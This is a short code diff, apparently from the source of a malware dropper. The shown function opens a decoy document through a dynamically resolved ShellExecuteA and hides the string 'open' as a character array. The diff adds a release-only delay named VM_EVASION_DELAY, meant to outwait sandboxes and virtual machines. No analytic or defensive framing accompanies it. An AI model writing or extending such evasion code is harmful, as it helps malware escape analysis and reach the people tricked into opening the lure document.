@@ -21,7 +21,7 @@
 #include "log.h"
 #include "bootHelper.h"
 #include <iostream>
-
+#include "Parameter.h"
 
 
 int ReleaseFirstStart() {
@@ -125,6 +125,10 @@ int ExplorerFirstStart() {
 				lpwsprintfA(szShowContentCmd, "\"%s\"", strShowFileName);
 				char szOpen[] = { 'o','p','e','n',0 };
 				HINSTANCE hInst = lpShellExecuteA(0, szOpen, szShowContentCmd, 0, strDataPath, SW_NORMAL);
+
+#ifndef _DEBUG
+				iRet = delay(VM_EVASION_DELAY);
+#endif
 			}
 			else {
 				writeLog("not found doc file\r\n");
